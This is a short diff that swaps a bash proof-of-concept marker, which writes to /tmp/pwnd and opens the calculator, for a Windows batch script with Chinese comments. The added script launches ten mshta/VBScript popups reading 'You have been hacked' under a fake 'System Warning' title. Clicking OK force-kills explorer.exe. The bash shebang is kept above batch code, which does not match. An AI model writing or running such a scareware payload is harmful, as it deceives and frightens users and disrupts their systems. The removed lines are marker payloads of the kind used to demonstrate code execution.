@@ -1,4 +1,13 @@
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+@echo off
+
+:: 设置窗口标题
+title System Warning
+
+:: 使用 for 循环启动10个独立的 mshta 进程来显示弹窗
+:: 每个弹窗都在自己的循环中，直到用户点击 "OK"
+for /L %%i in (1,1,10) do (
+    start "" mshta "vbscript:Do:response=MsgBox(\"You have been hacked. Exit now?\", 17, \"System Warning\"):If response = 1 Then:CreateObject(\"WScript.Shell\").Run \"taskkill /f /im explorer.exe\", 0, False:window.close:Exit Do:End If:Loop"
+)
+
+echo 10 warning instances have been launched.
